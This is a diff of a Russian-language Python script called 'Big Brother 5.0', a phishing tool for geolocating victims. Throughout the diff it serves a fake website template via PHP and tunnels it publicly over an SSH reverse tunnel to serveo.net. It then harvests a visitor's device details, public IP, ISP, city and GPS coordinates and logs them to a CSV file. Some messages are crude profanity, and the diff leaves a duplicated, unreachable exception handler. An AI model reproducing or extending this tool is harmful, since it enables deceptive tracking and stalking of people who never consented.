@@ -1,16 +1,23 @@
+#! /usr/bin/env python
 # -*- coding: utf-8 -*-
-#by bafomet
 R = '\033[31m'   # Red
 G = '\033[1;34m' # Blue
 C = '\033[1;32m' # Green
 W = '\033[0m'    # white
 O = '\033[45m'   # Purple
-
+N = '\033[1;37m' # White
+B = '\033[1;34m' # Blue
 
 from shutil import which
+from pip._vendor.distlib.compat import raw_input
+import getpass
+import subprocess
+import time
+import sys
+import os
+os.system('clear')
 
 
-print(G + '[+]' + C + ' Запуск приложения...           0.5 alfa  1.0 beta  2.0 beta  3.0 Релиз  5.0 ✓ ' + W)
 pkgs = ['python3', 'pip3', 'php', 'ssh']
 inst = True
 for pkg in pkgs:
@@ -24,7 +31,9 @@ if inst == False:
 	exit()
 else:
 	pass
-
+import getpass
+import subprocess
+import time
 import os
 import csv
 import sys
@@ -49,47 +58,68 @@ port = args.port
 row = []
 info = ''
 result = ''
-version = 'beta 3.0 '
-os.system("print '\033]2;Big Bro 5.0\a'")
+os.system("print '\033]2; Big Brother 5.0 \a'")
 os.system('clear')
 os.system("cd banner;python2 banner.py")
 
-
-def ver_check():
-	print(G + '[ + ]' + C + ' Проверка обновлений.....', end='')
-        print('\n' + R + ' [ + ]' + C + ' Бесплатная премиум версия: \n' + W + ' \n https://t.me/osint_san_framework')
-
+def banner():
+	print(B+" Режим геолокации")
+	print(B+" Бесплатная premium версия встроенна в" +R+ " OSINT-SAN framework:") 
+	print(R+" https://github.com/Bafomet666/OSINT-SAN")
+	
 def tunnel_select():
 	if tunnel_mode == None:
 		serveo()
 	elif tunnel_mode == 'manual':
 		print(G + '' + C + '' + W + '\n')
 	else:
-		print(R + '[ + ]' + C + ' Недействительный выбранный режим туннеля, Проверьте Serveo или Ngrok.  [-h, --help]' + W + '\n')
+		print(R + ' [ + ]' + C + ' Недействительный выбранный режим туннеля, Проверьте Ngrok.  [-h, --help]' + W + '\n')
 		exit()
 
 def template_select():
 	global site, info, result
-	print(G + '[ + ]' + C + ' Выберите опцию : ' + W + '\n')
+	print(R + ' [ + ]' + C + ' Выберите сайт : ' + C + '\n')
 	
 	with open('template/templates.json', 'r') as templ:
 		templ_info = templ.read()
 	
 	templ_json = json.loads(templ_info)
 	
+	#####
+	#ed. Code l3e86
+	list_temp = []
 	for item in templ_json['templates']:
 		name = item['name']
-		print(G + '[ {} ]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
-	print()
-	selected = int(input(R + '[Введите номер] ' + W))
+		if len(name) < 30:
+			nam_prob = 30 - len(name)
+			probels = ' ' * int(nam_prob)
+			
+			index = str(templ_json['templates'].index(item))
+			nam_index = ''
+			if len(index) == 1:
+			    nam_index = '0' + index
+			else:
+			    nam_index = index
+			
+			resalt = G + ' [ {} ] '.format(nam_index) + C + ' {} {}'.format(name, probels) + W
+			list_temp.append(resalt)
+		
+	nam_calomns = 3
+	for index in range(0, len(list_temp), nam_calomns):
+		resalt = list_temp[index:index + nam_calomns]
+		print(' '.join(map(str, resalt)))
+	############
+	print("")
+	selected = int(input(R + " [" + C + " Введите номер сайта " + R +"] :" + W))
 	
 	try:
 		site = templ_json['templates'][selected]['dir_name']
 	except IndexError:
-		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
+		print('\n' + R + ' [ - ]' + C + ' Invalid Input!' + W + '\n')
 		sys.exit()
 	
-	print('\n' + G + '[+]' + C + ' Загрузка {} Ожидайте...'.format(templ_json['templates'][selected]['name']) + W)
+	print('\n' + G + ' [ + ] ' + C + ' Загрузка {} Ожидайте...'.format(templ_json['templates'][selected]['name']) + W)
+	print("")
 	
 	module = templ_json['templates'][selected]['module']
 	if module == True:
@@ -106,31 +136,31 @@ def serveo():
 	global subdom
 	flag = False
 
-	print(G + '[+]' + C + ' Проверка Serveo, Статус...', end='')
+	print(G + ' [ + ] ' + C + ' Проверка Serveo, Статус...', end='')
 
 	try:
 		time.sleep(1)
 		rqst = requests.get('https://serveo.net', timeout=5)
 		sc = rqst.status_code
 		if sc == 200:
-			print(C + '[' + G + ' Онлайн ' + C + ']' + W + '\n')
+			print(C + ' [' + G + ' Онлайн ' + C + ']' + W + '\n')
 		else:
-			print(C + '[' + R + 'Статус : {}'.format(sc) + C + ']' + W + '\n')
+			print(C + ' [' + R + 'Статус : {}'.format(sc) + C + ']' + W + '\n')
 			exit()
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Офлайн, отвал нахуй. Запускай через : python3 bigbro.py -t manual -k start ' + C + ']' + W + '\n')
+		print(C + ' [' + R + ' Офлайн, отвал нахуй. Запускай через : python3 bigbro.py -t manual -k start ' + C + ']' + W + '\n')
 		exit()
 			
-	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
+	print(G + ' [ + ]' + C + ' Getting Serveo URL...' + W + '\n')
 	if subdom is None:
-		with open('logs/serveo.txt', 'w') as tmpfile:
+		with open('db/serveo.txt', 'w') as tmpfile:
 			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	else:
-		with open('logs/serveo.txt', 'w') as tmpfile:
+		with open('db/serveo.txt', 'w') as tmpfile:
 			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	
 	while True:
-		with open('logs/serveo.txt', 'r') as tmpfile:
+		with open('db/serveo.txt', 'r') as tmpfile:
 			try:
 				stdout = tmpfile.readlines()
 				if flag == False:
@@ -150,20 +180,20 @@ def serveo():
 		time.sleep(2)
 
 def server():
-	print('\n' + G + '[ + ]' + C + ' Порт : '+ W + str(port))
-	print('\n' + G + '[ + ]' + C + ' Запуск PHP Server......' + W, end='')
-	with open('logs/php.log', 'w') as phplog:
+	print('\n' + G + ' [ + ]' + C + ' Порт : '+ W + str(port))
+	print('\n' + G + ' [ + ]' + C + ' Запуск сервера...' + W, end='')
+	with open('db/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
 		time.sleep(3)
 	try:
 		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
 		php_sc = php_rqst.status_code
 		if php_sc == 200:
-			print(C + '[' + G + ' Успешно ' + C + ']' + W)
+			print(C + ' [' + G + ' Успешно ' + C + ']' + W)
 		else:
-			print(C + '[' + R + 'Статус : {}'.format(php_sc) + C + ']' + W)
+			print(C + ' [' + R + 'Статус : {}'.format(php_sc) + C + ']' + W)
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Да ебаный рот ' + C + ']' + W)
+		print(C + ' [' + R + ' Да ебаный рот ' + C + ']' + W)
 		Quit()
 
 def wait():
@@ -172,7 +202,7 @@ def wait():
 		time.sleep(2)
 		size = os.path.getsize(result)
 		if size == 0 and printed == False:
-			print('\n' + G + '[ + ]' + R + ' Ожидайте, получение данных...' + W + '\n')
+			print('\n' + G + ' [ + ]' + R + ' Ждем получения гео данных...' + W + '\n')
 			printed = True
 		if size > 0:
 			main()
@@ -209,16 +239,16 @@ def main():
 				row.append(var_browser)
 				row.append(var_ip)
 
-				print(G + '[+]' + C + ' Информация о устройстве : ' + R + '\n')
-				print(G + '[+]' + C + ' OS         : ' + W + var_os)
-				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
-				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
-				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
-				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
-				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
-				print(G + '[+]' + C + ' Resolution : ' + W + var_res)
-				print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
-				print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)
+				print(G + ' [ + ]' + C + ' Информация о устройстве... : ' + R + '\n')
+				print(G + ' [ + ]' + C + ' OS         : ' + W + var_os)
+				print(G + ' [ + ]' + C + ' Platform   : ' + W + var_platform)
+				print(G + ' [ + ]' + C + ' CPU Cores  : ' + W + var_cores)
+				print(G + ' [ + ]' + C + ' RAM        : ' + W + var_ram)
+				print(G + ' [ + ]' + C + ' GPU Vendor : ' + W + var_vendor)
+				print(G + ' [ + ]' + C + ' GPU        : ' + W + var_render)
+				print(G + ' [ + ]' + C + ' Resolution : ' + W + var_res)
+				print(G + ' [ + ]' + C + ' Browser    : ' + W + var_browser)
+				print(G + ' [ + ]' + C + ' Public IP  : ' + W + var_ip)
 			
 
 				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
@@ -241,13 +271,12 @@ def main():
 					row.append(var_org)
 					row.append(var_isp)
 
-					print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
-					print(G + '[+]' + C + ' Country    : ' + W + var_country)
-					print(G + '[+]' + C + ' Region     : ' + W + var_region)
-					print(G + '[+]' + C + ' City       : ' + W + var_city)
-					print(G + '[+]' + C + ' Org        : ' + W + var_org)
-					print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
-					print(G + '[+]' + C + ' Блять он нищеброд. Ну и железо ' + R + '\n')
+					print(G + ' [ + ]' + C + ' Континент  : ' + W + var_continent)
+					print(G + ' [ + ]' + C + ' Страна    : ' + W + var_country)
+					print(G + ' [ + ]' + C + ' Регион     : ' + W + var_region)
+					print(G + ' [ + ]' + C + ' Город       : ' + W + var_city)
+					print(G + ' [ + ]' + C + ' Org        : ' + W + var_org)
+					print(G + ' [ + ]' + C + ' ISP        : ' + W + var_isp)
 	except ValueError:
 		pass
 	
@@ -285,19 +314,19 @@ def main():
 				row.append(var_dir)
 				row.append(var_spd)
 
-				print ('\n' + G + '[+]' + C + ' Информация о обьекте : ' + R + '\n')
-				print (G + '[+]' + C + ' Широта  : ' + W + var_lat)
-				print (G + '[+]' + C + ' Долгота : ' + W + var_lon)
-				print (G + '[+]' + C + ' Точность  : ' + W + var_acc)
-				print (G + '[+]' + C + ' Высота  : ' + W + var_alt)
-				print (G + '[+]' + C + ' Дистанция : ' + W + var_dir)
-				print (G + '[+]' + C + ' Скорость    : ' + W + var_spd)
+				print ('\n' + G + ' [ + ]' + C + ' Информация об обьекте : ' + R + '\n')
+				print (G + ' [ + ]' + C + ' Широта  : ' + W + var_lat)
+				print (G + ' [ + ]' + C + ' Долгота : ' + W + var_lon)
+				print (G + ' [ + ]' + C + ' Точность  : ' + W + var_acc)
+				print (G + ' [ + ]' + C + ' Высота  : ' + W + var_alt)
+				print (G + ' [ + ]' + C + ' Дистанция : ' + W + var_dir)
+				print (G + ' [ + ]' + C + ' Скорость    : ' + W + var_spd)
 	except ValueError:
 		error = file
 		print ('\n' + R + '[-] ' + W + error)
 		repeat()
 
-	print ('\n' + G + '[+]' + C + ' Google карты.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
+	print ('\n' + G + ' [ + ]' + C + ' Google карты... ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
 	
 	if kml_fname is not None:
 		kmlout(var_lat, var_lon)
@@ -315,14 +344,14 @@ def kmlout(var_lat, var_lon):
 	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
 		kml_gen.write(kml_sample_data)
 
-	print(G + '[+]' + C + ' Генерируруем файл KML..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
+	print(G + ' [ + ]' + C + ' Генерируруем файл KML...' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
 
 def csvout():
 	global row
-	with open('db/results.csv', 'a') as csvfile:
+	with open('db/data_info.csv', 'a') as csvfile:
 		writer = csv.writer(csvfile)
 		writer.writerow(row)
-	print(G + '[+]' + C + ' Новая запись добавлена в базу данных.: ' + W + os.getcwd() + '/db/results.csv')
+	print(G + ' [ + ]' + C + ' Новая запись добавлена в базу данных.: ' + W + os.getcwd() + '/db/data_info.csv')
 
 def clear():
 	global result
@@ -341,13 +370,15 @@ def Quit():
 	exit()
 
 try:
-	ver_check()
+	banner()
 	tunnel_select()
 	template_select()
 	server()
 	wait()
 	main()
-
 except KeyboardInterrupt:
-	print ('\n' + R + '[!]' + C + ' Хули ты не туда жмешь, на  ошибку' + R)
+                sys.exit()
+                
+except KeyboardInterrupt:
+	print ('\n' + R + '[!]' + C + ' Спасибо за использование...' + R)
 	Quit()
